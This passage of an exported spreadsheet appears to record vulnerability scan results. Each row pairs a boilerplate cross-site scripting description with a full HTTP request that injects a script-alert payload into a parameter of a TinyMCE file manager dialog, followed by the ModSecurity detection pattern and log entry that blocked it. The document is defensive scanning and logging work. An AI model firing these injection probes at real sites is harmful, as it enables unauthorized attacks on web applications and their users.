</td><td class=xl24 width=64 >2015-04-01 09:16:46</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:45 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(536099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqJawQAW0AABt@bNsAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqJawQAW0AABt@bNsAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358355</td><td class=xl24 width=64 >2015-03-31 00:27:24</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e01</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(378499)&lt;/script&gt;&lt;!--&amp;5519719761e01=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28378499%29%2F; PHPSESSID=00ji8ianp60oiauat2ta3mqid4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:47</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:46 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(378499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqJqwQAW0AAB7zKEsAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqJqwQAW0AAB7zKEsAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358356</td><td class=xl24 width=64 >2015-03-31 00:27:56</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(362299)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=1ki205n6ak0f5i9svb70o895h0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:48</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:47 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(362299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqJ6wQAW0AAD9ieaYAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqJ6wQAW0AAD9ieaYAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358357</td><td class=xl24 width=64 >2015-03-31 00:29:40</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(162199)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=nk9u4c1tpvdb5r20qrss4vrkr2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:50</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:48 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(162199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqKKwQAW0AABu6pLAAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqKKwQAW0AABu6pLAAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358358</td><td class=xl24 width=64 >2015-03-31 00:30:50</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e01</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >5519719761e01</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e01=&quot;&gt;&lt;script&gt;alert(292899)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=d1evihrsgfk7au996ro1gpbnl2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:51</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:50 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:5519719761e01. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(292899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqKqwQAW0AABrOWbAAAAAJ&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqKqwQAW0AABrOWbAAAAAJ</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358359</td><td class=xl24 width=64 >2015-03-31 00:31:25</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(251299)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=j3p3bkbhqo7e7vuo8lghc75fu1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:52</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:51 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(251299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqK6wQAW0AAD9hYF0AAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqK6wQAW0AAD9hYF0AAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358360</td><td class=xl24 width=64 >2015-03-31 00:33:10</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(869399)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=35c1eb3p69v0v062kd7geu1eb7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:53</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:52 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(869399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqLKwQAW0AABvT9@4AAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqLKwQAW0AABvT9@4AAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358361</td><td class=xl24 width=64 >2015-03-31 00:36:35</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey='&gt;&lt;script&gt;alert(899499)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=ocooja528a3qu3i19kt3d85qt0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:55</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:53 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(899499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqLawQAW0AABqr3CUAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqLawQAW0AABqr3CUAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358362</td><td class=xl24 width=64 >2015-03-31 00:37:51</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
